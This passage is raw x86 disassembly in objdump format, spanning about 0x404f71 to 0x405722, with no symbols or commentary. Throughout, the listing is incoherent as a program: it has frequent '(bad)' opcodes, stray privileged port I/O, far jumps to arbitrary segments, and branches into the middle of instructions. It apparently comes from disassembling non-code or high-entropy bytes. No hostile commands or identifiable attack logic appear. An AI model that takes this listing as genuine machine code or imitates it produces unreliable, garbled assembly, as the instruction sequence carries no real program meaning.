  404f71:	les    esp,FWORD PTR [esi+0x5debfb48]
  404f77:	je     0x404fc3
  404f79:	push   eax
  404f7a:	jae    0x404fad
  404f7c:	test   DWORD PTR [eax],esp
  404f7e:	loope  0x404fa2
  404f80:	adc    ah,BYTE PTR [edx]
  404f82:	add    al,0x49
  404f84:	rdtsc  
  404f86:	stos   DWORD PTR es:[edi],eax
  404f87:	adc    DWORD PTR ds:[esi],edi
  404f8a:	retf   
  404f8b:	int    0x2a
  404f8d:	jne    0x404fdb
  404f8f:	dec    edi
  404f90:	adc    BYTE PTR [edx],cl
  404f92:	sub    dh,BYTE PTR [ebx+0x63e60b3f]
  404f98:	push   ds
  404f99:	jae    0x404f6f
  404f9b:	jbe    0x404f50
  404f9d:	push   0xa5913c44
  404fa2:	inc    eax
  404fa3:	xor    cl,BYTE PTR [ebx]
  404fa5:	sub    edx,DWORD PTR [ecx-0x59]
  404fa8:	(bad)  
  404fa9:	outs   dx,DWORD PTR ds:[esi]
  404faa:	lods   eax,DWORD PTR ds:[esi]
  404fab:	daa    
  404fac:	adc    BYTE PTR es:[edi],0x53
  404fb0:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fb2:	xor    bl,cl
  404fb4:	adc    BYTE PTR [ebx],dl
  404fb6:	int    0xef
  404fb8:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  404fba:	xchg   ecx,eax
  404fbb:	dec    ebp
  404fbc:	and    cl,BYTE PTR [edx+0xe]
  404fbf:	fwait
  404fc0:	cmp    al,0x72
  404fc2:	xchg   DWORD PTR [ecx+0x1d],esi
  404fc5:	sbb    DWORD PTR [esi],eax
  404fc7:	ss std 
  404fc9:	dec    ecx
  404fca:	repnz push 0xc09b1499
  404fd0:	or     ch,BYTE PTR [edx]
  404fd2:	loope  0x404fbb
  404fd4:	or     BYTE PTR cs:[edi+0x41a73ece],0xff
  404fdc:	cmp    DWORD PTR [esp+edi*4+0x585b8b0d],0xb37bbb99
  404fe7:	jae    0x405025
  404fe9:	and    bl,BYTE PTR [ebx+eiz*2-0x74]
  404fed:	adc    al,0x8f
  404fef:	iret   
  404ff0:	or     dl,bl
  404ff2:	fxch   st(4)
  404ff4:	inc    ebp
  404ff5:	fdiv   st,st(6)
  404ff7:	mov    ebx,0x325555b1
  404ffc:	and    dl,BYTE PTR [esi+0x79]
  404fff:	and    BYTE PTR fs:[ebp-0x48],0x25
  405004:	std    
  405005:	adc    bl,BYTE PTR [edi+0x64aa5a05]
  40500b:	fist   WORD PTR [esi+0x45]
  40500e:	cdq    
  40500f:	push   0xdca70f79
  405014:	pop    esi
  405015:	push   eax
  405016:	sub    al,0xfa
  405018:	xlat   BYTE PTR ds:[ebx]
  405019:	push   esp
  40501a:	jae    0x405057
  40501c:	mov    esp,0x8856ca15
  405021:	pusha  
  405022:	dec    ebx
  405023:	dec    eax
  405024:	pop    ecx
  405025:	jns    0x4050a6
  405027:	pop    ecx
  405028:	int    0xb3
  40502a:	xor    edi,DWORD PTR [edx-0x2dc52835]
  405030:	gs push ecx
  405032:	cmc    
  405033:	lods   al,BYTE PTR ds:[esi]
  405034:	xchg   ecx,eax
  405035:	jle    0x40501e
  405037:	sbb    DWORD PTR [ebx+0x1a],ecx
  40503a:	and    al,0x9d
  40503c:	mov    BYTE PTR [edx-0x56],dl
  40503f:	mov    bh,0x77
  405041:	and    al,0x20
  405043:	inc    ebx
  405044:	sub    al,0xc2
  405046:	and    al,0x21
  405048:	push   esi
  405049:	sti    
  40504a:	repz mov ds:0x25505dc3,al
  405050:	mov    ss,WORD PTR [edi+0x59d4397c]
  405056:	(bad)  
  405057:	rol    BYTE PTR [ebx],1
  405059:	loope  0x40508a
  40505b:	inc    esi
  40505c:	sbb    ebx,ebx
  40505e:	push   cs
  40505f:	mov    bl,0x37
  405061:	xchg   esi,eax
  405062:	mov    eax,0xc701e2fb
  405067:	in     eax,dx
  405068:	sbb    eax,0x3daf633d
  40506d:	pop    esp
  40506e:	clc    
  40506f:	add    BYTE PTR [esi],dl
  405071:	mov    edx,0xd6071ab5
  405076:	mov    dh,0x60
  405078:	rcr    BYTE PTR [ebx+0x22],1
  40507b:	add    eax,0x2b8040e3
  405080:	ror    DWORD PTR [eax],0x9a
  405083:	out    0x5b,al
  405085:	(bad)  
  405086:	pusha  
  405087:	(bad)  
  405088:	std    
  405089:	leave  
  40508a:	mov    edx,0xdcced9d
  40508f:	fiadd  DWORD PTR [edx-0x65]
  405092:	(bad)  
  405093:	in     eax,dx
  405094:	test   DWORD PTR [eax+0x718ce6fc],0xfb05f00e
  40509e:	sbb    BYTE PTR [edx+0x50],dl
  4050a1:	lahf   
  4050a2:	jp     0x4050dd
  4050a4:	mov    edx,0xd7fc2bf2
  4050a9:	(bad)  [edi+ebx*2+0x616907e9]
  4050b0:	pop    DWORD PTR [ecx-0x11]
  4050b3:	xchg   edx,eax
  4050b4:	mov    bh,0x4d
  4050b6:	loop   0x4050e8
  4050b8:	inc    ebx
  4050b9:	jne    0x4050e3
  4050bb:	push   ebx
  4050bc:	mov    BYTE PTR [eax+0x12],bl
  4050bf:	sub    eax,0x966bc6e2
  4050c4:	pusha  
  4050c5:	mov    bl,0x58
  4050c7:	sub    BYTE PTR [ecx+esi*4+0x5c570b30],dl
  4050ce:	jb     0x4050c8
  4050d0:	xchg   esi,eax
  4050d1:	pop    es
  4050d2:	test   al,0xae
  4050d4:	lds    edx,FWORD PTR [ecx-0x66]
  4050d7:	pop    ds
  4050d8:	lea    edi,[edi]
  4050da:	enter  0x1f2d,0x3e
  4050de:	neg    DWORD PTR [edx+0x59]
  4050e1:	or     edi,DWORD PTR [ebx+0x3b63229]
  4050e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e8:	sub    DWORD PTR [ebx-0x63c545c5],esp
  4050ee:	jmp    0x405138
  4050f0:	punpckldq mm3,DWORD PTR [edi]
  4050f3:	mov    ecx,0x349b3a27
  4050f8:	adc    eax,ecx
  4050fa:	jle    0x405105
  4050fc:	sbb    ah,BYTE PTR ds:0x88599f7e
  405102:	pause  
  405104:	ja     0x4050a6
  405106:	je     0x405114
  405108:	fwait
  405109:	bound  edx,QWORD PTR [edx]
  40510b:	mov    dl,BYTE PTR [ebx+eax*4-0x264251ae]
  405112:	(bad)  
  405113:	mov    esi,0x91cdc814
  405118:	pop    ebp
  405119:	test   DWORD PTR [ebx+0xf99ff44],edx
  40511f:	mov    dh,0x8
  405121:	jno    0x4050e1
  405123:	std    
  405124:	add    ebx,edx
  405126:	sub    dl,BYTE PTR [ebp-0x1cd7a6]
  40512c:	ja     0x40515e
  40512e:	stc    
  40512f:	push   esi
  405130:	(bad)  
  405131:	push   0xe3ca1798
  405136:	cmp    al,0x42
  405138:	add    eax,0x6c05db1d
  40513d:	inc    ebx
  40513e:	xchg   edi,eax
  40513f:	or     DWORD PTR ds:0xec825ec9,0xab33d13b
  405149:	leave  
  40514a:	ja     0x4050f3
  40514c:	jb     0x4050fd
  40514e:	loope  0x405151
  405150:	jmp    0x22fe:0x49a39666
  405157:	push   es
  405158:	xor    DWORD PTR [ebx-0x5],ebx
  40515b:	lods   al,BYTE PTR ds:[esi]
  40515c:	mov    al,ds:0x2024a267
  405161:	ja     0x4051a3
  405163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405164:	and    dh,dh
  405166:	push   ss
  405167:	out    dx,al
  405168:	jecxz  0x405161
  40516a:	outs   dx,DWORD PTR ds:[esi]
  40516b:	pop    esp
  40516c:	mov    ds:0x676d9292,eax
  405171:	scas   eax,DWORD PTR es:[edi]
  405172:	adc    DWORD PTR [ecx],ebx
  405174:	pop    es
  405175:	jg     0x405161
  405177:	jle    0x40515f
  405179:	nop
  40517a:	fpatan 
  40517c:	clc    
  40517d:	mov    edi,0x1b4f0805
  405182:	das    
  405183:	or     bh,bh
  405185:	fs out 0x70,al
  405188:	push   esp
  405189:	stc    
  40518a:	daa    
  40518b:	les    ecx,FWORD PTR [ebp-0x2aa29283]
  405191:	(bad)  
  405192:	rcr    esp,1
  405194:	xor    ecx,DWORD PTR [ebp+edi*4-0x28]
  405198:	aad    0x29
  40519a:	imul   esi,DWORD PTR [edi],0x820af1bd
  4051a0:	or     dh,BYTE PTR [ecx-0x5a]
  4051a3:	mov    eax,0x57c5e492
  4051a8:	dec    eax
  4051a9:	add    al,0x73
  4051ab:	dec    ebp
  4051ac:	(bad)  
  4051ad:	xor    esp,DWORD PTR [edi-0x24cc28e7]
  4051b3:	adc    esi,edx
  4051b5:	jg     0x4051ba
  4051b7:	pop    ebx
  4051b8:	push   ebp
  4051b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051ba:	push   ecx
  4051bb:	ficomp WORD PTR [esi+0x308e5a49]
  4051c1:	rcr    DWORD PTR [eax],1
  4051c3:	adc    eax,0xde11410d
  4051c8:	xor    al,0x53
  4051ca:	scas   al,BYTE PTR es:[edi]
  4051cb:	je     0x4051c0
  4051cd:	xor    BYTE PTR [ebx-0x24d080e3],0x46
  4051d4:	push   ds
  4051d5:	lahf   
  4051d6:	in     eax,dx
  4051d7:	je     0x4051b8
  4051d9:	mov    bh,0x34
  4051db:	add    eax,0xc3400450
  4051e0:	pusha  
  4051e1:	mov    edi,DWORD PTR [esi+0x66]
  4051e4:	mov    cl,0xa
  4051e6:	cwde   
  4051e7:	inc    ebx
  4051e8:	popf   
  4051e9:	icebp  
  4051ea:	adc    esi,ecx
  4051ec:	js     0x405253
  4051ee:	(bad)  
  4051ef:	repnz push edx
  4051f1:	and    dl,BYTE PTR [esi+0x5256ea03]
  4051f7:	je     0x405193
  4051f9:	fidiv  DWORD PTR [ecx+0x5c]
  4051fc:	pop    esp
  4051fd:	mov    bl,0x30
  4051ff:	inc    edi
  405200:	in     eax,0x81
  405202:	fs enter 0xdd7b,0xde
  405207:	stc    
  405208:	push   esp
  405209:	dec    eax
  40520a:	dec    eax
  40520b:	in     al,0x4a
  40520d:	xchg   esi,eax
  40520e:	lds    edi,FWORD PTR [edx]
  405210:	jecxz  0x405270
  405212:	inc    edx
  405213:	retf   
  405214:	xchg   BYTE PTR [esi+0x42380ac9],dl
  40521a:	fwait
  40521b:	call   0xc6cb:0xbbd442c6
  405222:	and    eax,0xa48de8b0
  405227:	pop    esp
  405228:	or     al,0x41
  40522a:	inc    edx
  40522b:	mov    bl,0x36
  40522d:	pop    edx
  40522e:	ret    
  40522f:	in     eax,dx
  405230:	pop    es
  405231:	jmp    0x6612f660
  405236:	and    BYTE PTR [edi-0x5f4be2c3],ch
  40523c:	add    eax,0xe459e176
  405241:	pusha  
  405242:	dec    edi
  405243:	xchg   DWORD PTR [edx+edx*2],esi
  405246:	push   ebx
  405247:	mov    ebx,0xce20d1bc
  40524c:	dec    ebx
  40524d:	fimul  DWORD PTR [ecx+0x50322d87]
  405253:	outs   dx,DWORD PTR ds:[esi]
  405254:	fcmovbe st,st(2)
  405256:	mov    ds:0x5ea37b48,eax
  40525b:	sar    edi,1
  40525d:	retf   0x7e2
  405260:	cmp    al,0x9f
  405262:	std    
  405263:	xchg   esp,eax
  405264:	sbb    DWORD PTR [edi],edi
  405266:	int    0x19
  405268:	mov    ch,BYTE PTR [ebx+edi*1]
  40526b:	xchg   esp,eax
  40526c:	xor    ebp,DWORD PTR [ecx]
  40526e:	mov    bh,0x32
  405270:	test   eax,0x28394287
  405275:	and    eax,0x8c4da190
  40527a:	jp     0x405214
  40527c:	xchg   ecx,eax
  40527d:	out    0x79,al
  40527f:	push   esp
  405280:	je     0x405212
  405282:	or     esp,esi
  405284:	lea    ecx,[edi]
  405286:	mov    ah,0x1a
  405288:	aad    0xcf
  40528a:	or     BYTE PTR [esi-0x21c86422],0x69
  405291:	cli    
  405292:	sbb    cl,BYTE PTR [ebp+0x17]
  405295:	imul   esp,DWORD PTR [edi+edi*4],0x13f35147
  40529c:	imul   ecx,ebx,0xcde37a96
  4052a2:	ret    0x9a18
  4052a5:	adc    bh,dl
  4052a7:	xchg   edx,eax
  4052a8:	xchg   edi,eax
  4052a9:	cmp    al,0xa0
  4052ac:	(bad)  
  4052ad:	loop   0x4052c2
  4052af:	outs   dx,DWORD PTR ds:[esi]
  4052b0:	adc    BYTE PTR [ecx-0x13],dh
  4052b3:	jo     0x4052c3
  4052b5:	test   DWORD PTR [eax],ecx
  4052b7:	jge    0x40532d
  4052b9:	xor    DWORD PTR [edi],esi
  4052bb:	pop    ecx
  4052bc:	fbstp  TBYTE PTR [edi]
  4052be:	mov    edx,0xe5cb98ef
  4052c3:	mov    WORD PTR [ecx],fs
  4052c5:	pop    ds
  4052c6:	ja     0x40528f
  4052c8:	les    ebx,FWORD PTR [ebp+0x6d2cfb53]
  4052ce:	(bad)  
  4052cf:	mov    ebx,0x5bace942
  4052d4:	neg    BYTE PTR [ebx-0x5f]
  4052d7:	pushf  
  4052d8:	sbb    al,0xb9
  4052da:	and    DWORD PTR [ebx],esi
  4052dc:	add    DWORD PTR [edx-0x6cafc35b],edi
  4052e2:	pop    ds
  4052e3:	inc    ebx
  4052e4:	shl    DWORD PTR es:[eax],1
  4052e7:	xor    ch,bh
  4052e9:	aaa    
  4052ea:	dec    esi
  4052eb:	sbb    eax,0x6940796d
  4052f0:	and    BYTE PTR [edi+eiz*8],ah
  4052f3:	jmp    0x9a5b6d36
  4052f8:	xchg   DWORD PTR [ebp+0x3f],ebx
  4052fb:	jp     0x4052b7
  4052fd:	mov    eax,ds:0x26025576
  405302:	cmp    al,0xf5
  405304:	fwait
  405305:	cli    
  405306:	retf   
  405307:	sub    DWORD PTR [eax+0x54],0x24
  40530b:	jle    0x4052a2
  40530d:	mov    ebx,0x8bf3fc4a
  405312:	cmp    eax,0xcf98acd2
  405317:	push   ecx
  405318:	xchg   ebx,eax
  405319:	es jo  0x405393
  40531c:	out    dx,eax
  40531d:	and    BYTE PTR [eax],0x3
  405320:	xchg   BYTE PTR [edx+0x20868eb9],cl
  405326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405327:	xchg   esi,eax
  405328:	mov    ds:0xad8bc7ee,eax
  40532d:	push   esi
  40532e:	or     eax,edx
  405330:	in     al,0x9
  405332:	aad    0x56
  405334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405335:	push   eax
  405336:	mov    edx,0xf867c0db
  40533b:	clc    
  40533c:	xor    BYTE PTR [edx+esi*1+0x41],dh
  405340:	and    al,0x71
  405342:	(bad)  [ebp-0x64]
  405345:	ss dec edi
  405347:	xlat   BYTE PTR ds:[ebx]
  405348:	jae    0x40539b
  40534a:	xor    edi,DWORD PTR [ebx-0x1a]
  40534d:	in     eax,0xf1
  40534f:	cmp    ebp,eax
  405351:	adc    cl,BYTE PTR [ebx-0x7]
  405354:	push   ds
  405355:	cmp    edi,eax
  405357:	dec    esi
  405358:	xchg   bh,bl
  40535a:	(bad)  
  40535b:	popa   
  40535c:	adc    BYTE PTR [edi],cl
  40535e:	fnstsw WORD PTR [edx+0x2d576bb4]
  405364:	fadd   st(4),st
  405366:	out    0xca,al
  405368:	fsub   DWORD PTR [esi+0x30]
  40536b:	adc    eax,0x540fc685
  405370:	jae    0x40539c
  405372:	arpl   WORD PTR [ecx-0x34],cx
  405375:	mov    dh,0xe
  405377:	lock push ebx
  405379:	fwait
  40537a:	inc    esi
  40537b:	daa    
  40537c:	int3   
  40537d:	ficom  DWORD PTR [eax-0x3e]
  405380:	dec    edi
  405381:	adc    edi,DWORD PTR [edx-0xa1ccf44]
  405387:	gs add al,0x9b
  40538a:	push   ecx
  40538b:	sahf   
  40538c:	pop    eax
  40538d:	pop    es
  40538e:	pop    ss
  40538f:	or     esi,ebp
  405391:	arpl   WORD PTR [ecx+0x74],di
  405394:	xor    al,bh
  405396:	mov    esp,0xced68a2f
  40539b:	mov    ecx,0x3132e4a8
  4053a0:	dec    ebx
  4053a1:	mov    esp,0x4271f2ab
  4053a6:	pop    ebx
  4053a7:	les    eax,FWORD PTR [edi]
  4053a9:	jp     0x405348
  4053ab:	push   0x2b
  4053ad:	mov    dl,0x25
  4053af:	add    BYTE PTR [esp+edx*2-0x2c39dc84],dh
  4053b6:	adc    al,0xa4
  4053b8:	cmp    DWORD PTR [eax],esp
  4053ba:	ins    BYTE PTR es:[edi],dx
  4053bb:	and    eax,0xe2be54f3
  4053c0:	push   0xffffffab
  4053c2:	imul   ebx,DWORD PTR [ecx-0x8],0x3febd44a
  4053c9:	inc    esi
  4053ca:	dec    esi
  4053cb:	mov    ebx,0xdf09b27f
  4053d0:	shr    DWORD PTR [esi],1
  4053d2:	pop    ss
  4053d3:	sbb    eax,0xb0fb0f06
  4053d8:	stos   BYTE PTR es:[edi],al
  4053d9:	shl    DWORD PTR [ecx],0x4
  4053dc:	push   edx
  4053dd:	mov    ebp,DWORD PTR [eax+0x742c3fdc]
  4053e3:	test   DWORD PTR [edi],esi
  4053e5:	(bad)  
  4053e6:	sbb    BYTE PTR [edi-0x13],dh
  4053e9:	xchg   edi,eax
  4053ea:	rcr    DWORD PTR [edx+edx*1+0x22],1
  4053ee:	pop    ss
  4053ef:	imul   ebp,DWORD PTR [ecx+0x16],0x24
  4053f3:	ds test ch,cl
  4053f6:	cmp    eax,0x1f21171d
  4053fb:	mov    ebp,DWORD PTR [ebx+0x3]
  4053fe:	xchg   edx,eax
  4053ff:	pop    ebp
  405400:	pusha  
  405401:	(bad)  
  405402:	fldenv [esi]
  405404:	retf   0xad7f
  405407:	cmp    ah,ah
  405409:	iret   
  40540a:	aam    0x76
  40540c:	and    edx,DWORD PTR [ecx+eax*4+0x4e57586]
  405413:	fisub  DWORD PTR [eax+0x66]
  405416:	pop    es
  405417:	adc    BYTE PTR [eax],dh
  405419:	xchg   ecx,eax
  40541a:	mov    bh,0x6
  40541c:	std    
  40541d:	loope  0x405484
  40541f:	xchg   ecx,eax
  405420:	adc    al,0xa1
  405422:	fistp  WORD PTR [ecx]
  405424:	jno    0x40545b
  405426:	inc    esi
  405427:	cmp    al,bl
  405429:	push   cs
  40542a:	mov    WORD PTR [esi],ss
  40542c:	retf   0x8676
  40542f:	or     ebx,ebx
  405431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405432:	(bad)  
  405433:	sahf   
  405434:	jl     0x40547f
  405436:	clc    
  405437:	imul   edx,DWORD PTR ds:0x16847cb1,0x7893daa7
  405441:	out    0xe7,eax
  405443:	inc    ebx
  405444:	inc    ebp
  405445:	stos   DWORD PTR es:[edi],eax
  405446:	dec    esi
  405447:	lds    edx,FWORD PTR [edx+eiz*1]
  40544a:	daa    
  40544b:	ds rcr eax,0xb2
  40544f:	out    0xfc,al
  405451:	shr    DWORD PTR [ecx],0xc6
  405454:	ss fs js 0x405425
  405458:	pushf  
  405459:	in     al,0x1c
  40545b:	mov    edi,0xb390232c
  405460:	jp     0x405417
  405462:	mov    DWORD PTR [esi+0x1d],eax
  405465:	add    edx,esi
  405467:	punpcklbw mm2,DWORD PTR [esi]
  40546a:	into   
  40546b:	cmp    esp,DWORD PTR [ecx-0xb]
  40546e:	mov    ds:0xcba2e95c,al
  405473:	jmp    0x4054cb
  405475:	xchg   ebp,eax
  405476:	or     ecx,DWORD PTR [ecx-0x32f7e0c0]
  40547c:	fbld   TBYTE PTR [edi+esi*4-0x3b]
  405480:	push   ss
  405481:	cmp    al,0xe4
  405483:	mov    dh,0xc0
  405485:	pop    ebx
  405486:	push   esi
  405487:	cdq    
  405488:	mov    ds:0xf2faf799,al
  40548d:	js     0x405459
  40548f:	adc    DWORD PTR [edi+0x1a],0xffffff80
  405493:	(bad)  
  405494:	jmp    edi
  405496:	(bad)  [ebx-0x6d4d4c83]
  40549c:	in     eax,dx
  40549d:	push   cs
  40549e:	and    eax,0x26017e2c
  4054a3:	mov    bl,0xc0
  4054a5:	add    BYTE PTR [ebx],ah
  4054a7:	push   ss
  4054a8:	shr    BYTE PTR [esi-0xdecb201],1
  4054ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054af:	mov    DWORD PTR [edi-0x328f11f0],esp
  4054b5:	sbb    BYTE PTR [ecx],0x5f
  4054b8:	popa   
  4054b9:	std    
  4054ba:	inc    esi
  4054bb:	aas    
  4054bc:	jae    0x405528
  4054be:	stc    
  4054bf:	push   eax
  4054c0:	or     DWORD PTR [edi-0x44],esi
  4054c3:	lds    ecx,FWORD PTR [ecx-0x12]
  4054c6:	fldcw  WORD PTR [ebx]
  4054c8:	clc    
  4054c9:	pop    esp
  4054ca:	mov    al,ds:0xfae15f65
  4054cf:	mov    esp,DWORD PTR [edi-0x34]
  4054d2:	loopne 0x4054e0
  4054d4:	jle    0x40547c
  4054d6:	(bad)  
  4054d7:	sub    eax,0x15aab2bc
  4054dc:	es test eax,0xc038c687
  4054e2:	mov    ds:0x8da6c82c,eax
  4054e7:	sub    dh,BYTE PTR [ecx]
  4054e9:	scas   al,BYTE PTR es:[edi]
  4054ea:	pop    edi
  4054eb:	add    BYTE PTR [edx],0xb9
  4054ee:	xchg   ebp,eax
  4054ef:	mov    eax,0x76911ba1
  4054f4:	je     0x40553d
  4054f6:	or     BYTE PTR [eax+0x62],ah
  4054f9:	int    0xe5
  4054fb:	push   eax
  4054fc:	mov    dh,0xff
  4054fe:	jne    0x405537
  405500:	mov    dl,0x2
  405502:	push   0x903b4d0
  405507:	and    BYTE PTR cs:[eax],ah
  40550a:	xor    DWORD PTR [edx],ecx
  40550c:	push   es
  40550d:	test   DWORD PTR [esi-0x4d],0x2ef53f6e
  405514:	mov    ah,0xc4
  405516:	inc    eax
  405517:	mov    eax,ds:0xa05ba214
  40551c:	ss xor al,0xd4
  40551f:	adc    DWORD PTR [edx],ecx
  405521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405522:	xor    eax,0x1ef6fba5
  405527:	cwde   
  405528:	mov    cl,BYTE PTR [esi+esi*4+0x40]
  40552c:	jae    0x405509
  40552e:	arpl   bp,cx
  405530:	mov    al,0xd5
  405532:	ss pop es
  405534:	adc    BYTE PTR [ecx-0x49],dl
  405537:	sub    al,0x53
  405539:	fsubrp st(5),st
  40553b:	mov    edx,0x48bef096
  405540:	(bad)  
  405541:	cmp    eax,0xf0175464
  405546:	jb     0x405562
  405548:	scas   eax,DWORD PTR es:[edi]
  405549:	lahf   
  40554a:	cmp    ebp,esp
  40554c:	cmp    edx,DWORD PTR [eax]
  40554e:	aam    0x79
  405550:	xor    al,0xc7
  405552:	sahf   
  405553:	jle    0x405540
  405555:	into   
  405556:	in     al,dx
  405557:	fadd   QWORD PTR [edi]
  405559:	(bad)  
  40555a:	jle    0x405564
  40555c:	jg     0x4055b4
  40555e:	imul   edi,DWORD PTR [ebp+0x2b],0x60
  405562:	jmp    0x9c787084
  405567:	and    eax,0xac081370
  40556c:	scas   eax,DWORD PTR es:[edi]
  40556d:	test   al,0xf6
  40556f:	mov    ah,0x58
  405571:	pop    eax
  405572:	(bad)  
  405573:	pusha  
  405574:	aad    0xe4
  405576:	outs   dx,DWORD PTR ds:[esi]
  405577:	mov    dh,BYTE PTR [ebx+0x15a058cc]
  40557d:	jge    0x40555f
  40557f:	sub    cl,BYTE PTR [edi-0x24]
  405582:	test   BYTE PTR [eax-0x62],ah
  405585:	cwde   
  405586:	cmp    edi,ecx
  405588:	sub    ch,BYTE PTR [ecx+0x65]
  40558b:	pop    esi
  40558c:	dec    ebp
  40558d:	idiv   BYTE PTR [edi-0x20088386]
  405593:	xor    bh,BYTE PTR [edx-0x16]
  405596:	mov    dh,0x96
  405598:	cwde   
  405599:	mov    ?,WORD PTR [ebx+edx*4-0x5c]
  40559d:	cli    
  40559e:	data16 (bad) [edx+0x73576a6a]
  4055a5:	pop    esi
  4055a6:	jns    0x40555e
  4055a8:	mov    eax,DWORD PTR [esi-0x5f]
  4055ab:	(bad)  
  4055ac:	pop    ss
  4055ad:	out    0x54,eax
  4055af:	xor    eax,esi
  4055b1:	cli    
  4055b2:	inc    ecx
  4055b3:	(bad)  
  4055b4:	loop   0x405603
  4055b6:	jmp    0x4055ee
  4055b8:	jmp    0x9750:0xb020c51d
  4055bf:	adc    al,0x82
  4055c1:	push   ds
  4055c2:	je     0x4055c4
  4055c4:	loopne 0x405628
  4055c6:	fnstcw WORD PTR [ebp+0x53]
  4055c9:	sub    al,0xc6
  4055cb:	dec    esp
  4055cc:	mov    bh,0xbd
  4055ce:	out    dx,al
  4055cf:	fisubr DWORD PTR [ecx+0x51]
  4055d2:	les    edx,FWORD PTR [ebx]
  4055d4:	test   DWORD PTR [edx+0x4bf54ece],esi
  4055da:	bound  ebx,QWORD PTR [eax]
  4055dc:	pop    esi
  4055dd:	sbb    DWORD PTR [edx],esi
  4055df:	je     0x4055f8
  4055e1:	fwait
  4055e2:	(bad)  
  4055e3:	xchg   ecx,eax
  4055e4:	mov    ds,edx
  4055e6:	and    edx,DWORD PTR [edi]
  4055e8:	or     BYTE PTR [ecx-0x38],al
  4055eb:	jle    0x405604
  4055ed:	jb     0x40564e
  4055ef:	rcr    esi,cl
  4055f1:	add    DWORD PTR [ebx],esp
  4055f3:	and    ecx,DWORD PTR [eax+0x127b5cba]
  4055f9:	pop    esp
  4055fa:	add    DWORD PTR [ecx],edi
  4055fc:	std    
  4055fd:	push   eax
  4055fe:	sub    al,0x61
  405600:	retf   
  405601:	ficomp WORD PTR [ecx]
  405603:	or     eax,0x4e033e40
  405608:	test   al,0xc1
  40560a:	jge    0x40558d
  40560c:	xchg   esp,eax
  40560d:	sbb    eax,0xa380f9b
  405612:	call   0x414c:0x9618d4d1
  405619:	iret   
  40561a:	daa    
  40561b:	adc    DWORD PTR [edi+0x6e],esp
  40561e:	call   FWORD PTR [ecx]
  405620:	xlat   BYTE PTR ds:[ebx]
  405621:	sub    al,0x2
  405623:	clc    
  405624:	adc    DWORD PTR [edx+edi*8-0x4f],edi
  405628:	idiv   BYTE PTR [eax-0x32]
  40562b:	pop    ss
  40562c:	aad    0x20
  40562e:	xor    al,0x1f
  405630:	pop    esi
  405631:	es in  ax,dx
  405634:	xchg   esi,eax
  405635:	arpl   sp,ax
  405637:	lahf   
  405638:	adc    al,0xca
  40563a:	inc    ecx
  40563b:	add    edx,ebx
  40563d:	popf   
  40563e:	bound  esp,QWORD PTR [eax+esi*8-0x1c]
  405642:	mov    ss,WORD PTR [eax-0x26]
  405645:	loope  0x405681
  405647:	sbb    al,0xa5
  405649:	test   BYTE PTR [ebp+0x17],0xae
  40564d:	push   eax
  40564e:	scas   eax,DWORD PTR es:[edi]
  40564f:	jo     0x405685
  405651:	adc    esp,DWORD PTR [edi+0x2e]
  405654:	sbb    esi,DWORD PTR [edi+0x483acd20]
  40565a:	inc    ebp
  40565b:	lds    edx,FWORD PTR [ebx-0x6]
  40565e:	push   esi
  40565f:	mov    edi,0xd8a02c50
  405664:	xchg   ebp,eax
  405665:	rol    BYTE PTR [ecx],cl
  405667:	inc    DWORD PTR [ecx-0x29ea9a7f]
  40566d:	test   al,0x97
  40566f:	lahf   
  405670:	imul   esi,ebp,0xf9d8eb61
  405676:	sti    
  405677:	cmp    ebp,edi
  405679:	lds    eax,FWORD PTR [ecx+ecx*4+0x1e6d6a36]
  405680:	int    0xf8
  405682:	sahf   
  405683:	test   al,0x97
  405685:	iret   
  405686:	in     eax,0xf6
  405688:	push   es
  405689:	nop
  40568a:	aam    0x23
  40568c:	sar    DWORD PTR [eax+eax*2-0x8],1
  405690:	in     eax,0x56
  405692:	addr16 jo 0x405670
  405695:	(bad)  
  405696:	rol    DWORD PTR fs:[ebp-0x1e],1
  40569a:	xchg   edi,eax
  40569b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40569c:	push   edx
  40569d:	clc    
  40569e:	add    al,0xbf
  4056a0:	dec    esp
  4056a1:	aas    
  4056a2:	mov    ds:0xb49ef4b,eax
  4056a7:	adc    DWORD PTR [ebx-0x3932ab6b],0xee00a0d4
  4056b1:	jbe    0x4056e7
  4056b3:	out    dx,al
  4056b4:	push   cs
  4056b5:	inc    edx
  4056b6:	in     al,0xd4
  4056b8:	test   BYTE PTR [edi*8-0x5649d951],bl
  4056bf:	push   0x9241c35f
  4056c4:	sbb    al,0xc0
  4056c6:	int3   
  4056c7:	add    eax,0xac65e16f
  4056cc:	pop    eax
  4056cd:	jl     0x40571a
  4056cf:	inc    edi
  4056d0:	pop    ebx
  4056d1:	and    BYTE PTR [edi],ah
  4056d3:	fs aam 0x9c
  4056d6:	jno    0x405662
  4056d8:	(bad)  
  4056d9:	test   al,0xfc
  4056db:	jge    0x40569b
  4056dd:	in     al,dx
  4056de:	int3   
  4056df:	adc    BYTE PTR ds:0xe6ac0288,cl
  4056e5:	repnz ins BYTE PTR es:[edi],dx
  4056e7:	rcl    DWORD PTR [eax+esi*4+0xf],1
  4056eb:	inc    eax
  4056ec:	shr    dh,cl
  4056ee:	pop    ds
  4056ef:	retf   
  4056f0:	retf   
  4056f1:	repz xchg edx,eax
  4056f3:	loopne 0x40575c
  4056f5:	dec    edi
  4056f6:	mov    al,0x15
  4056f8:	and    esp,DWORD PTR [ebx+0x3b]
  4056fb:	out    dx,al
  4056fc:	les    ebp,FWORD PTR [edx-0x4b]
  4056ff:	sbb    esp,DWORD PTR [ecx-0x5e35175f]
  405705:	mov    ah,0x39
  405707:	pop    edx
  405708:	adc    cl,0x7c
  40570b:	leave  
  40570c:	mov    ss,WORD PTR [eax]
  40570e:	shl    DWORD PTR [ecx-0x4a61eae9],1
  405714:	(bad)  
  405715:	jnp    0x4056f0
  405717:	mov    ah,0x15
  405719:	cs (bad) 
  40571b:	in     eax,dx
  40571c:	mov    esi,0x88f6ffc1
  405721:	xchg   ecx,eax
  405722:	pop    ss
